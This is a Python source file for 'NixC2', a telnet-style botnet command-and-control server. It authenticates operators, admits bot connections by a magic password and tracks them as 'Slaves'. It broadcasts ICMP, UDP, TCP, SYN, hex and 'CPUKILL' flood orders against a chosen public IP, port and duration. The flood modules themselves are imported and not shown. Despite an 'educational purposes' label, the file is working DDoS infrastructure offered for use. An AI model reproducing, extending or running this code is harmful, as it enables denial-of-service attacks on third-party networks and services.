#!/usr/bin/env python3
#-*- coding: utf-8 -*-

# Layer 3
from Commands.icmp import icmp

# Layer 4
from Commands.junk import junk
from Commands.std import std
from Commands.syn import syn
from Commands.tcp import tcp
from Commands.tcpsyn import tcpsyn
from Commands.udp import udp
from Commands.cpukill import cpukill
from Commands.hex import hex

# Layer 7
"""Coming soon"""

# Imports
import socket, threading, sys, time, ipaddress
from colorama import Fore, init

# Banners
l_banner = """
\x1b[3;31;40m    ╔════════════════════════════════════════════════╗
\x1b[3;31;40m    ║
\x1b[3;31;40m    ║    \033[1;37m╔╗╔ ╦ ═╗ ╦ ╔═╗╔═╗  
\x1b[3;31;40m    ║    \033[1;37m║║║ ║ ╔╩╦╝ ║  ╔═╝  
\x1b[3;31;40m    ║    \033[1;37m╝╚╝ ╩ ╩ ╚═ ╚═╝╚═╝              
\x1b[3;31;40m    ║    \033[1;37m                    
\x1b[3;31;40m    ╚════════════════════════════════════════════════╝
        """

banner = """
\x1b[3;31;40m    ╔════════════════════════════════════════════════╗
\x1b[3;31;40m    ║
\x1b[3;31;40m    ║    \033[1;37m╔╗╔ ╦ ═╗ ╦ ╔═╗╔═╗           Rules:
\x1b[3;31;40m    ║    \033[1;37m║║║ ║ ╔╩╦╝ ║  ╔═╝  
\x1b[3;31;40m    ║    \033[1;37m╝╚╝ ╩ ╩ ╚═ ╚═╝╚═╝   Home connections only          
\x1b[3;31;40m    ║    \033[1;37m                    
\x1b[3;31;40m    ║    \033[1;37mDiscord: Nix:8502    No spamming attacks
\x1b[3;31;40m    ║
\x1b[3;31;40m    ║    \033[1;37mType: HELP for help
\x1b[3;31;40m    ╚════════════════════════════════════════════════╝
        """

about = """
\x1b[3;31;40m    ╔════════════════════════════╗
\x1b[3;31;40m    ║\033[1;37m * Author : Nix        
\x1b[3;31;40m    ║
\x1b[3;31;40m    ║\033[1;37m * For educational purposes 
\x1b[3;31;40m    ╚════════════════════════════╝
"""

help = """
\x1b[3;31;40m    ╔═════════════════════════════════════════╗
\x1b[3;31;40m    ║\033[1;37m HELP    [Shows list of commands]   
\x1b[3;31;40m    ║\033[1;37m HOW     [Shows usage of attacks]    
\x1b[3;31;40m    ║\033[1;37m METHODS [Shows list of attack methods] 
\x1b[3;31;40m    ║\033[1;37m ABOUT   [About NixC2]          
\x1b[3;31;40m    ║\033[1;37m CLEAR   [Clears the screen]     
\x1b[3;31;40m    ║\033[1;37m LOGOUT  [Disconnects from the net]
\x1b[3;31;40m    ║\033[1;37m EXIT    [Disconnects from the net]
\x1b[3;31;40m    ╚═════════════════════════════════════════╝
"""

how = """
\x1b[3;31;40m    ╔═════════════════════════════╗
\x1b[3;31;40m    ║\033[1;37m     How to send attacks  
\x1b[3;31;40m    ║\033[1;37m  [IP] [PORT] [TIME] [SIZE] 
\x1b[3;31;40m    ╚═════════════════════════════╝
"""

methods = """
\x1b[3;31;40m    ╔═══════════════════════════════════════════════════════════╗
\x1b[3;31;40m    ║\033[1;37m   Type      Methods               Description           
\x1b[3;31;40m    ║═══════════════════════════════════════════════════════════╗
\x1b[3;31;40m    ║\033[1;37m  LAYER3   * .icmp       I.C.M.P Flood              
\x1b[3;31;40m    ║\033[1;37m  LAYER4   * .udp        UDP Junk Flood             
\x1b[3;31;40m    ║\033[1;37m  LAYER4   * .tcp        TCP Junk Flood                 
\x1b[3;31;40m    ║\033[1;37m  LAYER4   * .syn        SYNchromize Flood          
\x1b[3;31;40m    ║\033[1;37m  LAYER4   * .tcpsyn     TCP/SYN Flood   
\x1b[3;31;40m    ║\033[1;37m  LAYER4   * .std        Standard Internet Flood        
\x1b[3;31;40m    ║\033[1;37m  LAYER4   * .hex        Specific HEXIDECIMAL Flood     
\x1b[3;31;40m    ║\033[1;37m  LAYER4   * .cpukill    CPUKILL Attack (Ramps up CPU)  
\x1b[3;31;40m    ║\033[1;37m  LAYER4   * .junk       JUNK Flood       
\x1b[3;31;40m    ╚═══════════════════════════════════════════════════════════╝
"""

logo = """

░░░░░░░░░░░▄▄▄▄▄
░░░░░░░▄▄█████████▄▄
░░░░▄▀▀▀▀█▀▀▀▀▀▀█████▄
░░▄██████░░░░░░░░░░░▀██
░▐██████▌░░░░░░░░░░░░░▐▌
░███████▌░░░░░░░░░░░░░░█
▐████████░░░░░░░░░░░░░░░█
▐██████▌░░░░░▄▀▀▀▀▀▄░▀░▄▄▌
░█▀▀███▀░░░░░░▄▀█▀░░░▐▄▄▄▌
▐░▌▀▄░░░░░░░░░░▄▄▄▀░░░▌▀░▌
░▌▐░░▌░░░░░░░░░░░▀░░░░▐░▐
░▐░▀▄▐░░░░░░░░░░░▌▌░▄▄░▐░▌
░░▀█░▄▀░░░░░░░░░▐░▐▄▄▄▄▀▐
░░░▌▀░▐░░░░░░░░▄▀░░▀▀▀▀░▌
░░░▐░░░░░░░░░▌░░░▄▀▀▀▀▄▐
░░░▌░░░░░░░░░▐░░░░░▄▄░░▌
░░█▀▄░░░▐░▐░░░░░░░░░░░█
░█░█░▀▀▄░▌░█░░░▀▀▄▄▄▄▀
█░░░▀▄░░▀▀▄▄█░░░░░▄▀
░░░░░░▀▄░░░░▀▀▄▄▄▀▐
█░░░░░░░▀▄░░░░░▐░▌▐
░█░░░░░░░░▀▄░░░▌░▐▌▐
░░█░░░░░░░░░█░▐░▄▄▌░█▀▄
░░░█░░░░░░░░░█▌▐░▄▐░░▀▄▀▀▄▄
░░░░█░░░░░░░░░▀▄░░▐░░░▀▄░░░▀▀▄▄
░░░░░▀▄░▄▀█░░░░░█░░▌░░░░▀▄░░░░░█

"""

bots = {}
ansi_clear = '\033[2J\033[H'

# Validate IP
def validate_ip(ip):
    parts = ip.split('.')
    return len(parts) == 4 and all(x.isdigit() for x in parts) and all(0 <= int(x) <= 255 for x in parts) and not ipaddress.ip_address(ip).is_private

# Validate Port
def validate_port(port, rand=False):
    if rand:
        return port.isdigit() and int(port) >= 0 and int(port) <= 65535
    else:
        return port.isdigit() and int(port) >= 1 and int(port) <= 65535

# Validate attack time
def validate_time(time):
    return time.isdigit() and int(time) >= 10 and int(time) <= 1300

# Validate buffer size
def validate_size(size):
    return size.isdigit() and int(size) > 1 and int(size) <= 65500

# Read credentials from login file
def find_login(username, password):
    credentials = [x.strip() for x in open('logins.txt').readlines() if x.strip()]
    for x in credentials:
        c_username, c_password = x.split(':')
        if c_username.lower() == username.lower() and c_password == password:
            return True

# Checks if bots are dead
def ping():
    while 1:
        dead_bots = []
        for bot in bots.keys():
            try:
                bot.settimeout(3)
                send(bot, 'PING', False, False)
                if bot.recv(1024).decode() != 'PONG':
                    dead_bots.append(bot)
            except:
                dead_bots.append(bot)
            
        for bot in dead_bots:
            bots.pop(bot)
            bot.close()
        time.sleep(5)

# Client handler
def handle_client(client, address):
    send(client, f'\x1b[3;31;40mNixC2 | Login: Awaiting Response...\a', False)
    while 1:
        send(client, ansi_clear, False)
        for x in l_banner.split('\n'):
            send(client, '\x1b[3;31;40m'+x)
        send(client, f'\x1b[1;37m    Username :\x1b[0m ', False, False)
        username = client.recv(1024).decode().strip()
        if not username:
            continue
        break

    # Password Login
    password = ''
    while 1:
        send(client, f'\033[1;37m    Password :\x1b[0;38;2;0;0;0m ', False, False)
        while not password.strip(): 
            password = client.recv(1024).decode('cp1252').strip()
        break
        
    # Handle client
    if password != '\xff\xff\xff\xff\75':
        send(client, ansi_clear, False)

        if not find_login(username, password):
            send(client, Fore.RED + '\x1b[3;31;40m Invalid credentials')
            time.sleep(1)
            client.close()
            return

        threading.Thread(target=update_title, args=(client, username)).start()
        threading.Thread(target=command_line, args=[client]).start()

    # Handle bot
    else:
        # Check if bot is already connected
        for x in bots.values():
            if x[0] == address[0]:
                client.close()
                return
        bots.update({client: address})

# Send data to client or bot
def send(socket, data, escape=True, reset=True):
    if reset:
        data += Fore.RESET
    if escape:
        data += '\r\n'
    socket.send(data.encode())

# Send command to all bots
def broadcast(data):
    dead_bots = []
    for bot in bots.keys():
        try:
            send(bot, f'{data} 32', False, False)
        except:
            dead_bots.append(bot)
    for bot in dead_bots:
        bots.pop(bot)
        bot.close()

# Updates Shell Title
def update_title(client, username):
    while 1:
        try:
            send(client, f'\33]0;NixC2 | Slaves: {len(bots)} | User: {username}\a', False)
            time.sleep(2)
        except:
            client.close()

# Telnet Command Line
def command_line(client):
    for x in banner.split('\n'):
        send(client, '\x1b[3;31;40m'+x)
    prompt = f'\x1b[3;31;40mNixC2 \x1b[3;33;40m$ '
    send(client, prompt, False)

    while 1:
        try:
            data = client.recv(1024).decode().strip()
            if not data:
                continue

            args = data.split(' ')
            command = args[0].upper()
            
            if command == 'ABOUT':
                for x in about.split('\n'):
                    send(client, '\x1b[3;31;40m'+x)
            if command == 'HELP':
                for x in help.split('\n'):
                    send(client, '\x1b[3;31;40m'+x)
            if command == 'HOW':
                for x in how.split('\n'):
                    send(client, '\x1b[3;31;40m'+x)
            elif command == 'METHODS':
                for x in methods.split('\n'):
                    send(client, '\x1b[3;31;40m'+x)
            elif command == 'LOGO':
                for x in logo.split('\n'):
                    send(client , '\x1b[3;31;48m'+x)
            elif command == 'CLEAR':
                send(client, ansi_clear, False)
                for x in banner.split('\n'):
                    send(client, '\x1b[3;31;48m'+x)
            elif command == 'CLS':
                send(client, ansi_clear, False)
                for x in banner.split('\n'):
                    send(client, '\x1b[3;31;48m'+x)
            elif command == 'LOGOUT':
                send(client, '\x1b[3;31;48mSuccessfully Logged out\n')
                time.sleep(1)
                break
            elif command == 'EXIT':
                send(client, '\x1b[3;31;48m32mSuccessfully Logged out\n')
                time.sleep(1)
                break
            elif command == '.UDP': # UDP Junk (Random UDP Data)
                udp(args, validate_ip, validate_port, validate_time, validate_size, send, client, ansi_clear, attack_sent2, broadcast, data)
            elif command == '.TCP': # TCP Junk (Random TCP Data)
                tcp(args, validate_ip, validate_port, validate_time, validate_size, send, client, ansi_clear, attack_sent2, broadcast, data)
            elif command == '.SYN': # SYN flood
                syn(args, validate_ip, validate_port, validate_time, send, client, ansi_clear, attack_sent1, broadcast, data)
            elif command == '.TCPSYN': # TCP/SYN Flood
                tcpsyn(args, validate_ip, validate_port, validate_time, send, client, ansi_clear, attack_sent1, broadcast, data)
            elif command == '.STD': # Standard Internet Flood
                std(args, validate_ip, validate_port, validate_time, send, client, ansi_clear, attack_sent1, broadcast, data)
            elif command == '.ICMP': # Internet Control Message Protocol Flood
                icmp(args, validate_ip, validate_port, validate_time, send, client, ansi_clear, attack_sent1, broadcast, data)
            elif command == '.HEX': # Specific HEXIDECIMAL Flood
                hex(args, validate_ip, validate_port, validate_time, send, client, ansi_clear, attack_sent1, broadcast, data)
            elif command == '.CPUKILL': # CPUKILL Attack (Ramps up CPU)
                cpukill(args, validate_ip, validate_port, validate_time, send, client, ansi_clear, attack_sent1, broadcast, data)
            elif command == '.JUNK': # JUNK Flood
                junk(args, validate_ip, validate_port, validate_time, send, client, ansi_clear, attack_sent1, broadcast, data)
            send(client, prompt, False)
        except:
            break
    client.close()

screenedSuccessfully = """
        ╔════════════════════════════════════╗
        ║                                    ║
        ║        Successfully Screened       ║
        ║     ───────────────────────────    ║
        ║            ╔══════════╗            ║
        ╚════════════╣   LOGS   ╠════════════╝
                     ╚══════════╝
  
"""

def attack_sent1(ip, port, secs, client):
    send(client, f"")
    send(client, f"\x1b[3;31;40m                   ╔═════════════════════════════╗")
    send(client, f"\x1b[3;31;40m                   ║         \033[1;37mAttack sent!        ║")
    send(client, f"\x1b[3;31;40m          ╔═══════════════════════════════════════════════╗")
    send(client, f"\x1b[3;31;40m          ║         \033[1;37mAttack order sent to: {len(bots)} Slaves")
    send(client, f"\x1b[3;31;40m    ╔═══════════════════════════════════════════════════════════╗")
    send(client, f"\x1b[3;31;40m    ║")
    send(client, f"\x1b[3;31;40m    ║              \033[1;37mIP     : {ip}")
    send(client, f"\x1b[3;31;40m    ║              \033[1;37mPort   : {port}")
    send(client, f"\x1b[3;31;40m    ║              \033[1;37mTime   : {secs}")
    send(client, f"\x1b[3;31;40m    ║  ")
    send(client, f"\x1b[3;31;40m    ╚═══════════════════════════════════════════════════════════╝")
    send(client, f"")

def attack_sent2(ip, port, secs, size, client):
    send(client, f"")
    send(client, f"\x1b[3;31;40m                   ╔═════════════════════════════╗")
    send(client, f"\x1b[3;31;40m                   ║         \033[1;37mAttack sent!        ║")
    send(client, f"\x1b[3;31;40m          ╔═══════════════════════════════════════════════╗")
    send(client, f"\x1b[3;31;40m          ║         \033[1;37mAttack order sent to: {len(bots)} Slaves")            
    send(client, f"\x1b[3;31;40m    ╔═══════════════════════════════════════════════════════════╗")
    send(client, f"\x1b[3;31;40m    ║")
    send(client, f"\x1b[3;31;40m    ║              \033[1;37mIP     : {ip}")
    send(client, f"\x1b[3;31;40m    ║              \033[1;37mPort   : {port}")
    send(client, f"\x1b[3;31;40m    ║              \033[1;37mTime   : {secs}")
    send(client, f"\x1b[3;31;40m    ║              \033[1;37mSize   : {size}")
    send(client, f"\x1b[3;31;40m    ║  ")
    send(client, f"\x1b[3;31;40m    ╚═══════════════════════════════════════════════════════════╝")
    send(client, f"")

def main():
    if len(sys.argv) != 2:
        print(f'Usage: screen python3 {sys.argv[0]} <C2 Port>')
        exit()
    port = sys.argv[1]
    if not port.isdigit() or int(port) < 1 or int(port) > 65535:
        print('\x1b[3;31;40m Invalid C2 port')
        exit()
    port = int(port)
    init(convert=True)
    sock = socket.socket()
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    print(screenedSuccessfully)
    try:
        sock.bind(('0.0.0.0', port))
    except:
        print('\x1b[3;31;40m Failed to bind port')
        exit()
    sock.listen()
    threading.Thread(target=ping).start() # Start keepalive thread
    # Accept all connections
    while 1:
        threading.Thread(target=handle_client, args=[*sock.accept()]).start()

if __name__ == '__main__':
    try:
        main()
    except Exception:
        print('Error, skipping..')
